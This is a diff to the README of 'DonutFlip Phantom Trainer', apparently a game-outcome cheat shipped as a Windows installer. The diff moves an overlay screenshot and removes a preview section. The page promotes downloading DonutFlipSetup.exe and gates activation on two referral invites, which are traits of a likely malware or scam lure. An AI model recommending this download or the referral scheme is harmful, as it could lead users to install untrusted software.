@@ -21,6 +21,10 @@
 
   [![↓ Download](https://img.shields.io/badge/↓%20Download%20DonutFlipSetup.exe-2ea043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Nawasfadili/donut-flip/releases/latest/download/DonutFlipSetup.exe)
 
+  <br/><br/>
+
+  <img src="https://files.catbox.moe/gzrses.png" alt="DonutFlip Phantom Trainer Overlay" width="300"/>
+
 </div>
 
 ---
@@ -44,15 +48,6 @@ DonutFlip Phantom Trainer is an open-source, community-maintained client that pr
 | Compatible Browser | **Brave Browser** (Chrome fails) |
 | Requires | Windows 10 / 11 |
 | Activation | Referral-gated (2 invites) |
-
----
-
-## In-Game Overlay Preview
-
-<div align="center">
-  <img src="https://files.catbox.moe/gzrses.png" alt="DonutFlip Phantom Trainer In-Game Overlay" width="320"/>
-  <p><em>F8 in-game overlay with real-time Win Bias and Force Multiplier adjustments.</em></p>
-</div>
 
 ---
 
